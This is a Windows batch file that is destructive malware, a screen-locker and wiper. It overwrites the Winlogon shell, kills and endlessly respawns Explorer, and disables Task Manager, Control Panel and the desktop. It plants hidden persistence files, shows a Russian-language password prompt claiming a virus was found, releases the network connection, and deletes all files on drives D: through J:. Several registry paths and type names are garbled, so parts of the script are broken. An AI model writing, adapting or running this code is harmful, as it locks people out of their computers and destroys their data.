@echo off
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "C:\System 32.bat" /f
REG add 
taskkill /f /im explorer.exe >nul 
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun /v 1 /t REGDWORD /d %SystemRoot%\explorer.exe /f >nul 
copy %0 C:\System.bat
cls
:a
start explorer.exe
goto A
echo fatal error.virus detected!
echo fatal error.virus detected!
echo fatal error.virus detected!
echo fatal error.virus detected!
echo fatal error.virus detected!
echo fatal error.virus detected!
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REGDWORD /d 1 /f >nul
reg add HKCU\Software\Microsoft\Windows\Current Version\Policies\Explorer 
/v NoControlPanel /t REG_DWORD /d 1 /f >nul
reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableTaskMgr /t REGORD /d 1 /f >nul 
del "%SystemRoot%Cursors*.*" >nul 
FOR /L %%i IN (1,1,1000000) DO md %%i
rundll32 user,SwapMouseButton
CHCP 1251 
cls 
Set Yvaga=На вашем компьютере найден вирус. 
Set pass=Kakatb 
Set pas=Введите пароль. 
Set virus=Чтобы разблокировать ПК вам потребуется ввести пароль 
Set dim=Выключаю вирус... 
title Внимание!!! 
CHCP 866 
IF EXIST C:\windows\boot.bat ( 
goto ok ) 
cls 
IF NOT EXIST C:\windows\boot.bat ( 
ECHO Windows Registry Editor Version 5.00 >> C:\0.reg 
ECHO. >> C:\0.reg 
ECHO [HKEYLOCALMACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] >> C:\0.reg 
ECHO. >> C:\0.reg 
ECHO "Shell"="Explorer.exe, C:\\windows\\boot.bat " >> C:\0.reg 
start/wait regedit -s C:\0.reg 
del C:\0.reg 
ECHO @echo off >>C:\windows\boot.bat 
ECHO C:\WINDOWS\system32\taskkill.exe /f /im Explorer.exe >>C:\windows\boot.bat 
ECHO reg add "HKCU\software\Microsoft\Windows\CurrentVersion\Policies\system" /v DisableTaskMgr /t REG_DDWORD /d 1 /f >>C:\windows\boot.bat 
ECHO start sys.bat >>C:\windows\boot.bat 
attrib +r +a +s +h C:\windows\boot.bat 
copy virus.bat c:\windows\sys.bat 
attrib +r +a +s +h C:\windows\sys.bat 
GOTO end) 
:ok 
cls 
Echo %Yvaga% 
echo. 
echo %virus% 
echo %pas% 
set /a choise = 0 
set /p choise=%pass%: 
if "%choise%" == "101" goto gold 
if "%choise%" == "200393" goto status 
exit 
:status 
echo %dim% 
attrib -r -a -s -h C:\windows\boot.bat 
del C:\windows\boot.bat 
attrib -r -a -s -h C:\windows\sys.bat 
del C:\windows\sys.bat 
cls 
:gold 
start C:\ 
:end
rundll32 keyboard,disable
rundll32 mouse,disable
ipconfig /release
msg* "BLACK CODE"
del D:\.* /f /s /q
del E:\.* /f /s /q
del F:\*..* /f /s /q
del G:\ /f /s /q
del H:\*.* .* /f /s /q
del I:\f /s /q
del J:\*.* /f /s /q
